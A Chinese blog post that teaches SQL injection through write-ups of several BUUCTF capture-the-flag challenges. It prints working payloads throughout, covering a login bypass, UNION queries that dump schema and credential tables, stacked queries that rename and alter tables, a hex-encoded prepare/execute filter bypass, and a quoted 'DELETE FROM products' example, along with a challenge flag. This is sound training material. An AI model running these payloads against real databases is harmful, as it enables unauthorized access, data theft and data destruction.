原文链接：https://blog.csdn.net/m0_73734159/article/details/133928538?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22133928538%22%2C%22source%22%3A%22m0_73734159%22%7D

<a name="vKdJg"></a>
# 深入了解SQL注入
<a name="PkjbR"></a>
## **什么是SQL注入？**
SQL注入即是指[web应用程序](https://baike.baidu.com/item/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/2498090?fromModule=lemma_inlink)对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的[SQL语句](https://baike.baidu.com/item/SQL%E8%AF%AD%E5%8F%A5/5714895?fromModule=lemma_inlink)，在管理员不知情的情况下实现非法操作，以此来实现欺骗[数据库服务器](https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8/613818?fromModule=lemma_inlink)执行非授权的任意查询，从而进一步得到相应的数据信息。（百度百科）<br />SQL注入是Web安全常见的一种攻击手段，其主要存在于数据库中，用来窃取重要信息，在输入框、搜索框、登录窗口、交互式等等都存在注入可能；是否是输入函数无法判断其输入的合法性并将其作为PHP等语言代码来执行，或整体逻辑出现缺陷，或关键字关键命令关键字符没过滤全，包括编码加密命令是否进行了过滤，这些种种环节的防护不严都将导致SQL注入的成功。（本人拙见）
<a name="gcNHY"></a>
### SQL注入按照注入点类型来分可以分为常见的三大类：

1. 数字型注入：当输入的参数为整型的时候，如果存在注入漏洞，则可以认为是数字型注入。

`select * from BaiMao where id='1'`

2. 字符型注入：和数字型恰恰相反，当输入的参数为字符串的时候，如果存在注入漏洞，则可以认为是字符型注入，不同的一点是，数字型注入参数需要闭合，而字符型注入参数不需要闭合。

`select * from BaiMao where id=' 1' '`

3. 搜索型注入：网站具有搜索功能，但开发人员忽略了对变量、关键字、命令的过滤，从而导致了注入可能，也可以称为文本框注入。
<a name="nULIB"></a>
### 常见注入手法分类：
> 基于从服务器接收到的响应
> 	基于报错的SQL注入
> 	联合查询注入
> 	堆查询注入
> SQL盲注
> 	基于布尔SQL盲注
> 	基于时间SQL盲注
> 	基于报错SQL盲注
> 基于程度和顺序的注入
> 	一阶注入
> 	二阶注入
> 	一阶注射是指输入的注射语句对 WEB 直接产生了影响，出现了结果；二阶注入类似存
> 储型 XSS，是指输入提交的语句，无法直接对 WEB 应用程序产生影响，通过其它的辅助间
> 接的对 WEB 产生危害，这样的就被称为是二阶注入.
> 基于注入点的位置
> 	通关用户输入的单表域注射
> 	通过cookie注射
> 	通关服务器变量注射（基于头部信息的注入）
> 此处参考博客：https://blog.csdn.net/m0_46571665/article/details/124946824?spm=1001.2014.3001.5506

<a name="MP7o6"></a>
## 万能密码实验原理
用户进行登陆验证的时候，就会对其用户名和密码参数进行验证，而验证的过程就是网站需要查询数据库，而查询数据库的本质就是后台要执行SQL语句。<br />咱们可以测试一下，原来后台执行的数据库查询操作（SQL语句）：<br />`select username,password from BaiMao where username='用户名' and password='密码'`<br />由于网站后台在进行数据库查询的时候没有对单引号进行过滤，或者说是过滤不严，当输入用户名【admin】和万能密码【1' or '1'='1】的时候，执行的SQL语句为：<br />`select username,password from BaiMao where username='admin' and password=' 1' or '1'='1 '`<br />再者SQL语句中逻辑运算符具有优先级，【=】>【and】>【or】,且适用传递性，因此这个SQL语句在后台进行解析时，分成了两句，（【注意】1'时字符型注入，所以可以只看这 or '1'='1)<br />`select username,password from BaiMao where username='admin' and password=' 1 '`和【' 1 '】，两句bool（布尔类型）值进行逻辑or运算，恒为true,SQL查询语句的结果就为true，这就意味着认证成功，成功登录到系统当中。
<a name="Gizf0"></a>
### 【例题：】buuctf [极客大挑战 2019]EasySQL 1
网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269227979-fd564186-7adb-4eaf-9e3e-8424fdd19fa4.png#averageHue=%230c0c0c&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u1f8820fd&originHeight=934&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=569569&status=done&style=none&taskId=u5bf2ca64-b145-4ca8-9fea-76843b29330&title=&width=1530.4)<br />可以看到是一个登录窗口，题目已经说了是SQL注入<br />首先试一下弱口令，admin,123<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697269500707-e261da2b-33fa-446f-b907-e898575facae.png#averageHue=%23100909&clientId=uf24ad900-2f88-4&from=paste&height=747&id=u4b689535&originHeight=934&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=576337&status=done&style=none&taskId=ue42bb3eb-811a-4bb8-a5ad-0a9c898c1fb&title=&width=1519.2)<br />提示用户名密码错了<br />既然是第一道题，那应该是很简单了<br />判断是数字型还是字符型

1. 数字型

`and 1=1 回显正常`<br />`and 1=2 返回异常，存在数字型注入可能`

2. 字符型

`1 返回正常`<br />`1' 返回异常，存在字符型注入可能`<br />经过测试，发现username和password两个参数都可以分别注入和同时注入<br />构造payload<br />`url?usename=1'&password=1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270426620-acb3876c-9f0d-4dad-b7b5-b7e2f50b557f.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=750&id=uac410499&originHeight=938&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=578355&status=done&style=none&taskId=u9824586b-054d-4e84-998e-a4f99a53025&title=&width=1532.8)<br />回显报错，存在SQL字符型注入<br />**小试一下万能密码注入**<br />构造payload<br />`url?usename=1' or '1'='1&password=1' or '1'='1`<br />**回显flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697270808644-23610741-6cba-4ccc-ac0d-20688612546d.png#averageHue=%230b0a0a&clientId=u50427f58-e377-4&from=paste&height=746&id=u61a5ec44&originHeight=933&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588001&status=done&style=none&taskId=u34c8a5ee-5cfa-462d-8975-2dd088f61f5&title=&width=1524)<br />![](https://cdn.nlark.com/yuque/0/2023/jpeg/36016220/1697271707206-5d837e64-976e-44fc-b710-05a0ca10dd88.jpeg)<br />原文链接：[https://blog.csdn.net/m0_73734159/article/details/133827153?spm=1001.2014.3001.5501](https://blog.csdn.net/m0_73734159/article/details/133827153?spm=1001.2014.3001.5501)
<a name="W7krD"></a>
## 字符型注入和堆叠查询手法原理
**堆叠注入原理**
> 在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。
> 参考：https://blog.csdn.net/qq_26406447/article/details/90643951

<a name="WKK4H"></a>
### 【例题】buuctf[强网杯 2019]随便注 1
<a name="evxPg"></a>
#### **第一种解法 堆叠注入**
网页环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697680807481-dba73d7b-18cf-44a0-93e3-38592d9b232b.png#averageHue=%23f1f1f0&clientId=udbb228e3-387b-4&from=paste&height=212&id=uf8ac1bac&originHeight=265&originWidth=1168&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24915&status=done&style=none&taskId=u76ec8906-f57c-4324-97ac-6d6ebbb9e94&title=&width=934.4)<br />判断是否是字符型注入<br />`1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697681943555-c6fd1469-3469-4e53-a161-3a5aaf2029a0.png#averageHue=%23eeeeed&clientId=udbb228e3-387b-4&from=paste&height=162&id=u56bd0ea5&originHeight=202&originWidth=1388&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25694&status=done&style=none&taskId=u39d2368e-44f6-460e-b1c2-d72e699df55&title=&width=1110.4)<br />判断是否存在关键字过滤<br />`select`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697683665353-13241f7d-ab74-4190-9e19-ae2a85c8bd7e.png#averageHue=%23eeeded&clientId=udbb228e3-387b-4&from=paste&height=176&id=u35f4a366&originHeight=220&originWidth=1163&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24568&status=done&style=none&taskId=u7459f24e-b95a-4f43-9b7c-2452341cb87&title=&width=930.4)<br />联合查询被过滤，只能用堆叠注入了<br />查看有几个字段<br />`1' order by 2#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697685059548-1fdb03a4-5597-4be0-b4aa-1de494b8ff49.png#averageHue=%23f2f2f1&clientId=udbb228e3-387b-4&from=paste&height=231&id=u1fdbf4f3&originHeight=289&originWidth=1169&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25066&status=done&style=none&taskId=u1e3cc0be-65f2-497b-8af3-d3513d11612&title=&width=935.2)<br />正常回显<br />`1' order by 3#`![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697685144295-986def3d-fc59-4fa3-b40f-69c75dbd6840.png#averageHue=%23ecebea&clientId=udbb228e3-387b-4&from=paste&height=156&id=u3442ddd1&originHeight=195&originWidth=1138&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23618&status=done&style=none&taskId=u2b086f6e-13c1-406a-8715-0350b091e55&title=&width=910.4)<br />回显报错，可以看出只有两个字段<br />查看所有数据库<br />`1'; show databases;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697682480913-dbda1551-c9c2-4027-8411-65a3db6c5a60.png#averageHue=%23f9f9f9&clientId=udbb228e3-387b-4&from=paste&height=652&id=u7e5317b3&originHeight=815&originWidth=1166&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33555&status=done&style=none&taskId=u81e5d8df-1d83-48b4-8287-69a8ad69681&title=&width=932.8)<br />查看所有数据表<br />`1'; show tables;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697682571665-ff2bcf7d-bcdd-47f7-adae-b3dac6bff559.png#averageHue=%23f6f5f5&clientId=udbb228e3-387b-4&from=paste&height=368&id=u16d4462e&originHeight=460&originWidth=1109&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27495&status=done&style=none&taskId=u91c19cf1-9689-44e7-afbc-5fc8c775ac2&title=&width=887.2)<br />爆words数据表的字段<br />`1';show columns from words;#`![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697683209151-3dfe3324-bfaf-465e-9e8e-288dcb7eff8f.png#averageHue=%23f9f9f8&clientId=udbb228e3-387b-4&from=paste&height=673&id=ua7e0ec08&originHeight=841&originWidth=1123&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33791&status=done&style=none&taskId=u25d35ba1-5bc2-49da-86ce-e86d33c84d4&title=&width=898.4)<br />爆1919810931114514数据表字段（注意数据表为数字的时候需要用反引号括起来）<br />`1';show columns from `1919810931114514`;#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697683534413-5d13ce87-1495-4067-8f66-a9fb741cdbe1.png#averageHue=%23f7f7f7&clientId=udbb228e3-387b-4&from=paste&height=454&id=u798a0c31&originHeight=568&originWidth=1197&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30021&status=done&style=none&taskId=u22a06d9d-b0b4-459c-810d-bd4f4b2fe4f&title=&width=957.6)<br />可以看到这两个表words表有两个字段，而另一个只有一个字段<br />后台SQL查询语句应该是：<br />`select * from words where id=`<br />所以说只能先查询id字段，然而另一个表只有一个flag字段是肯定爆不了flag的，并且类型为varchar字符串类型，而恰巧words数据表里面的data也是varchar类型，因此从这里就可以得到做题思路，通过rename函数进行改表，把`1919810931114514`改为words，增加新字段id，将flag改为data，将刚开始那个words表改为其他任意表。<br />构造payload：<br />`1';rename table words to BaiMao;rename table `1919810931114514` to words;alter table words add id int unsigned not NULL auto_increment primary key;alter table words change flag data varchar(100);#`
> rename修改表名
> alter修改已知的列
> add增加
> int整数类型
> unsigned无符号类型
> **not null**- 指示某列不能存储 NULL 值。
> **primary key** - NOT NULL 和 UNIQUE 的结合。指定主键，确保某列（或多个列的结合）有唯一标识，每个表有且只有一个主键。
> **auto_increment**-自动赋值，默认从1开始。

成功回显flag：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697697090390-89609906-a4ad-4468-a7e2-f7f80af43f92.png#averageHue=%23f9f9f9&clientId=udbb228e3-387b-4&from=paste&height=160&id=u0a645650&originHeight=200&originWidth=562&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=4858&status=done&style=none&taskId=u70786f3d-e5fa-45cd-baa4-b77d8e0381c&title=&width=449.6)<br />注意没有回显flag，就类似于你更新了个东西但是没刷新，重新在文本框里面输入1提交即可回显flag。
<a name="z4q8F"></a>
#### 第二种解法 编码逃逸 绕过滤
由于select被过滤，考虑使用编码进行绕过<br />使用select查询就很简单了<br />构造payload<br />`select *from where `1919810931114514`` (注意这里使用反引号把这个数字括起来，md编辑器打不上去）<br />*号查询数据表里面的全部内容，这就是爆出flag的原理<br />进行16进制编码加密<br />`73656c656374202a2066726f6d20603139313938313039333131313435313460`<br />最终payload：<br />`1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#`
> - prepare…from…是预处理语句，会进行编码转换。
> - execute用来执行由SQLPrepare创建的SQL语句。
> - SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
> - 0x就是把后面的编码格式转换成十六进制编码格式
> - 那么总体理解就是，使用SeT方法给变量a赋值，给a变量赋的值就是select查询1919810931114514表的所有内容语句编码后的值，execsql方法执行来自a变量的值，prepare...from方法将执行后的编码变换成字符串格式，execute方法调用并执行execsql方法。
> 
参考：https://blog.csdn.net/qq_44657899/article/details/10323914

回显flag：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697700472481-49c8e237-7ee4-4891-8d17-1e0f629d2269.png#averageHue=%23f4f4f3&clientId=udbb228e3-387b-4&from=paste&height=300&id=u6e106fb7&originHeight=375&originWidth=1179&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27185&status=done&style=none&taskId=ue157f737-b168-481f-bee8-9cfb66d5a39&title=&width=943.2)
<a name="E2zV0"></a>
#### 第三种解法 handler代替select
select命令被过滤了怎么办？我们还可以用handler命令进行查看，handler命令可以一行一行的显示数据表中的内容。<br />构造payload：<br />`1'; handler `1919810931114514` open as `a`; handler `a` read next;#`
> handler代替select，以一行一行显示内容
> open打开表
> as更改表的别名为a
> read next读取数据文件内的数据次数

上传payload，回显flag：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1697701424155-918f1774-b39e-49a8-9e74-38b197ba782f.png#averageHue=%23f3f3f2&clientId=udbb228e3-387b-4&from=paste&height=300&id=u60b52bd2&originHeight=375&originWidth=1111&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26741&status=done&style=none&taskId=u5ac40b9a-50bd-40ff-b710-cc007a9f140&title=&width=888.8)<br />原文链接：[https://blog.csdn.net/m0_73734159/article/details/134049744?spm=1001.2014.3001.5501](https://blog.csdn.net/m0_73734159/article/details/134049744?spm=1001.2014.3001.5501)
<a name="zzKCR"></a>
## 数字型注入和堆叠查询手法原理
<a name="gjjce"></a>
### 【例题】[SUCTF 2019]EasySQL 1
题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664486260-6f6c0019-9130-4140-a1b2-9cceb09022f5.png#averageHue=%23f8f7f5&clientId=u0afe607f-2d1f-4&from=paste&height=202&id=uf83fd9bc&originHeight=253&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21417&status=done&style=none&taskId=u889268b8-2948-42df-b872-3ff591d0b4b&title=&width=700.8)
> 把你的旗子给我，我会告诉你旗子是不是对的。

判断注入类型<br />`1'`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664852183-4cfdd7bb-3ea9-4ce9-be1c-96f1fa803094.png#averageHue=%23f6f4f2&clientId=u0afe607f-2d1f-4&from=paste&height=150&id=uccc2f919&originHeight=187&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21241&status=done&style=none&taskId=ub4f7196d-1f32-4f95-9828-3ef2dcffc4d&title=&width=697.6)
> 不是字符型SQL注入

`1`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698664998585-28a658de-ffeb-4417-8a45-efb1eb80f4a8.png#averageHue=%23f7f6f4&clientId=u0afe607f-2d1f-4&from=paste&height=186&id=u4da01599&originHeight=232&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24755&status=done&style=none&taskId=uaa1a1096-cd48-4975-9a5a-9cd4a963bf0&title=&width=700.8)
> 数字型SQL注入

查所有数据库,采用堆叠注入<br />`1;show databases;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698665929401-d1ed791e-3482-437f-922e-d2013b67d69e.png#averageHue=%23f7f6f4&clientId=u0afe607f-2d1f-4&from=paste&height=175&id=u4356b753&originHeight=219&originWidth=1725&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36187&status=done&style=none&taskId=u11f7d0dc-8874-456c-b792-bd23c079d14&title=&width=1380)<br />查看所有数据表<br />`1;show tables;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698733249276-b42032e3-6c64-471b-a9de-6a02dafdec20.png#averageHue=%23f9f8f7&clientId=u250485b3-3c63-4&from=paste&height=138&id=u666a75c4&originHeight=172&originWidth=748&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10564&status=done&style=none&taskId=ue2f2e90a-b7c3-402f-8ec9-55e97ce2274&title=&width=598.4)<br />尝试爆Flag数据表的字段<br />`1;show columns from Flag;`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698736004092-1706d5e8-718a-4c60-b84c-d8138080676f.png#averageHue=%23f5f3f1&clientId=u250485b3-3c63-4&from=paste&height=99&id=udd705357&originHeight=124&originWidth=506&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6587&status=done&style=none&taskId=uc246e44f-a815-4917-8a0b-541bf4ebe3c&title=&width=404.8)
> 回显错误

到这里，大佬们直接猜出了后端语句<br />`select $_GET['query'] || flag from Flag`<br />我直接好家伙，大佬果然是大佬<br />||就是SQL里面的逻辑或运算符
<a name="ozCCH"></a>
#### **第一种解法 添加新列绕过逻辑或运算符：**
`***,1**`<br />那么传到后端语句就是<br />`select *,1 || flag from Flag`<br />这里我问了下文心一言，看完我也理解了
> 这段SQL代码的含义是：从Flag表中选择所有的列，以及由列flag的值与数字1进行连接生成的新列。
> 具体来说：
> select *：选择所有的列。
> 1 || flag：这是SQL中的字符串连接操作。它将数字1与flag列的值进行连接。对于每一行，都会生成一个新的字符串，这个字符串是数字1后跟着flag列的值。如果flag列的值本身是一个字符串，那么这两个字符串将被连接起来。
> from Flag：从Flag表中选择数据。
> 因此，这段代码的输出结果将包含Flag表的所有列，以及一个名为“1”的列，该列的值是flag列的值与数字1的连接。

大致意思，就是查看数据表Flag的所有列内容，然后添加了一个由列flag的值与数字1进行连接生成的新列，这个新的列名就叫1，那么猜测或者说就是flag被过滤，我们还能查到flag列的值，因为flag的值复制到了新的列1。<br />`*,0`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737425920-147348c3-d409-45b9-9b64-209c06dd4d8a.png#averageHue=%23f8f7f6&clientId=u250485b3-3c63-4&from=paste&height=138&id=u45a419d4&originHeight=172&originWidth=896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12977&status=done&style=none&taskId=ub124435b-76cb-4bd6-adb0-d78454b724a&title=&width=716.8)<br />可以明显看到新的列名0和flag的值连接起来了<br />`*,1`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737517157-c053430c-0783-483f-88da-60128f6c574b.png#averageHue=%23f9f8f7&clientId=u250485b3-3c63-4&from=paste&height=134&id=udcd5aa28&originHeight=168&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11928&status=done&style=none&taskId=u24a871c4-5ee0-488d-ac55-0c5553132bc&title=&width=697.6)<br />对吧，新列名为1<br />`*,2`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698737591497-1936851a-330a-466f-a205-11b2f7e39480.png#averageHue=%23f8f7f6&clientId=u250485b3-3c63-4&from=paste&height=132&id=uc69c71a0&originHeight=165&originWidth=900&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12687&status=done&style=none&taskId=ua5ebc9c4-61a9-45ad-8be0-9b8ba35a996&title=&width=720)<br />还是为1，所有还可以看出Flag数据表的列只能是两个
<a name="Dxhjs"></a>
#### **第二种解法 改逻辑或运算符为字符串连接符：**
既然题目内置的是逻辑或运算符，那咱们直接把它改成字符串连接符不就好了嘛（滑稽）<br />使用set方法定义sql_mode参数设置，PIPES_AS_CONCAT字符串连接符`select 1`查询第一列<br />`1;set sql_mode=PIPES_AS_CONCAT;select 1`<br />回显结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698738692889-3662a38c-076f-43de-88a8-67ac47a48fe4.png#averageHue=%23f5f3f0&clientId=u250485b3-3c63-4&from=paste&height=171&id=u8a1c556a&originHeight=214&originWidth=977&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29510&status=done&style=none&taskId=uf50e8da8-0feb-41e0-ae03-bd8c13b3cdc&title=&width=781.6)<br />可以明显看出解法1和解法2的回显结果有明显不同<br />原文链接：[https://blog.csdn.net/m0_73734159/article/details/134142483?spm=1001.2014.3001.5501](https://blog.csdn.net/m0_73734159/article/details/134142483?spm=1001.2014.3001.5501)
<a name="nYEWL"></a>
## 字符型注入和联合查询手法原理（常见注入手法）
<a name="zypjM"></a>
### 【例题】[极客大挑战 2019]LoveSQL 1
题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909690636-861c392b-5073-4df5-8a76-4449c01db1c6.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=825&id=u10ec8acf&originHeight=1031&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=597645&status=done&style=none&taskId=u8621b856-cfb9-441c-aba3-1d48365d194&title=&width=1534.4)
<a name="p4sxq"></a>
#### 判断注入类型
是否为数字型注入
> `admin`
> `1`

回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909822674-6098ec0a-53be-4f1d-b49f-b46bf99dbf72.png#averageHue=%23241e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=ufde74f60&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=606286&status=done&style=none&taskId=u3a7a0892-3a22-4e00-a2e6-e1c476a1cf5&title=&width=1536)
> 否

是否为字符型注入
> `admin`
> `1'`

回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698909907759-b0b66239-ffcf-4a5e-a80c-4134772788ab.png#averageHue=%231d1d1d&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=ua7cdc6f2&originHeight=1032&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=608102&status=done&style=none&taskId=ue4086c16-4114-4e3d-b8f4-f18afffe7de&title=&width=1536)
> 是

<a name="YE5tn"></a>
#### 判断注入手法类型
> 使用堆叠注入
> 采用密码参数进行注入

爆数据库<br />`1'; show database();#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910081201-ec66c41b-491a-4f7f-956f-41c24cf17780.png#averageHue=%231f1f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u6cca4a46&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609596&status=done&style=none&taskId=ubd1cc3e5-f6c7-4fc9-9899-da9eb316751&title=&width=1536)
> 这里猜测注入语句某字段被过滤，或者是';'被过滤导致不能堆叠注入

爆字段数<br />`1';order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910291949-9d34bc6b-f088-43dd-ae34-9cb3d98a6e41.png#averageHue=%231e1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=ue653c0b2&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=609461&status=done&style=none&taskId=u014c81be-9a36-4a0c-91c0-a33f4b83262&title=&width=1536)
> 报错
> 抛弃堆叠注入

<a name="PGFsP"></a>
#### **步入正题**
`1' order by 4#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910383188-ae75dce9-d7c8-4dd4-b815-71fb6ba05d21.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=830&id=u5a0a5819&originHeight=1037&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=600087&status=done&style=none&taskId=u58510ae9-b899-4664-bbc6-cd4a4a0d405&title=&width=1536)
> 成功，但是不存在第4列
> 同时验证了猜想不能使用堆叠注入

继续判断列数<br />`1' order by 3#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910478755-1e7e63c9-0354-45a3-abc2-2f6f535e0003.png#averageHue=%23221c1c&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u0c2aade0&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=605355&status=done&style=none&taskId=ue936570e-9310-42eb-9dbc-a98cbc98a60&title=&width=1536)
> 可知列数只有3列

爆数据库<br />使用联合查询<br />`1' union select 1,2,database()#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698910666459-6a3a6b11-fa82-4b48-ad00-31c05b76c161.png#averageHue=%231f1e1e&clientId=u93f0fa3e-5d73-4&from=paste&height=831&id=u731be2bc&originHeight=1039&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=617140&status=done&style=none&taskId=u91b4f4eb-e65b-471e-a60a-1c63c12e91d&title=&width=1536)<br />爆数据表<br />`1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911070730-12c0a4b1-543d-46c5-9f8b-3b8623ab9df2.png#averageHue=%231e1e1d&clientId=u93f0fa3e-5d73-4&from=paste&height=829&id=u7b0fd8e4&originHeight=1036&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=623639&status=done&style=none&taskId=udc09894c-f0b0-4554-92c7-b9b241f8f57&title=&width=1536)
> 爆出两个表
> 开始爆数据表的字段
> 按照先后顺序把，先爆第一个

爆geekuser数据表的字段<br />`1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='geekuser'#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698911854728-50b4b69b-1a11-4896-b284-af320e648a7e.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=833&id=u295cb7ff&originHeight=1041&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613173&status=done&style=none&taskId=udcf4212e-cce5-446d-8c80-c0856916610&title=&width=1536)
> 字段：id、username、password

爆geekuser数据表的所有内容<br />`1' union select 1,database(),group_concat(id,username,password) from geekuser#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912168291-6e041779-91e5-4a60-a71c-6234905cdde4.png#averageHue=%23201f1f&clientId=u93f0fa3e-5d73-4&from=paste&height=834&id=u67d2e3eb&originHeight=1042&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=618210&status=done&style=none&taskId=u69c75f31-d772-4757-b782-116847fb745&title=&width=1536)
> 无flag

转手数据表l0ve1ysq1<br />步骤和数据表geekuser一样，这里直接爆数据表l0ve1ysq1的flag值<br />`1' union select 1,database(),group_concat(password) from l0ve1ysq1#`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912423460-3c81bdee-fb79-40c6-a33f-77d1ef31e897.png#averageHue=%23242322&clientId=u93f0fa3e-5d73-4&from=paste&height=828&id=u6276eb70&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=630684&status=done&style=none&taskId=uad685c97-2037-4584-b5df-0a79cd79221&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698912445735-b36fc7d2-cb85-49a3-a1bf-e1d6f21d01e5.png#averageHue=%23222222&clientId=u93f0fa3e-5d73-4&from=paste&height=826&id=u20939a6e&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=613901&status=done&style=none&taskId=ua38fbf35-d9a8-422a-b92e-f8170c73537&title=&width=1536)<br />**得出flag：**<br />`flag{3c4b1ff9-6685-4dcb-853e-06093c1e4040}`<br />原文链接：[https://blog.csdn.net/m0_73734159/article/details/134185235?spm=1001.2014.3001.5501](https://blog.csdn.net/m0_73734159/article/details/134185235?spm=1001.2014.3001.5501)






